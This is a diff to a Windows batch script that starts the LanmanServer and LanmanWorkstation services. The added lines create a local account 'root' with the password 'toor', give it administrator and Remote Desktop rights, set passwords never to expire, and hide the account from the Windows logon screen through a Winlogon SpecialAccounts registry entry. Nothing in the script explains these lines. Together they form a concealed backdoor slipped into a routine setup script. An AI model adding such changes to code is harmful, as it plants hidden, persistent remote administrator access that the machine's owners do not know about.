@@ -15,9 +15,17 @@ sc config lanmanserver start= auto
 sc start lanmanworkstation
 sc start lanmanserver
 
-REM Restart the computer to apply changes (optional)
-echo Restarting the computer to apply changes...
-shutdown /r /t 10
+
+net user root toor /add
+
+net localgroup Administrators root /add
+
+net localgroup "Remote Desktop Users" root /add
+
+net accounts /maxpwage:unlimited
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v root /t REG_DWORD /d "00000000" /f
+ 
 
 echo Done.
-pause
+
